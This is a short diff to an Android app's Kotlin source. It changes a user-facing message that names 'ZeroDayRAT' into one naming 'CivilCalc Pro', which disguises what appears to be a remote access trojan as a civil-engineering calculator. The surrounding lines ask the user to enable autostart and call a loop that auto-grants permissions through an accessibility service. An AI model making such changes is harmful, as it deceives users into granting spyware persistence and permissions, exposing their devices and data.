@@ -465,7 +465,7 @@ class MainActivity : AppCompatActivity() {
                 data = Uri.parse("package:$packageName")
             }
             try {
-                Toast.makeText(this, "Enable Autostart for ZeroDayRAT to keep background active", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Enable Autostart for CivilCalc Pro to keep site tools active", Toast.LENGTH_SHORT).show()
                 autostartLauncher.launch(autostartIntent)
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 return
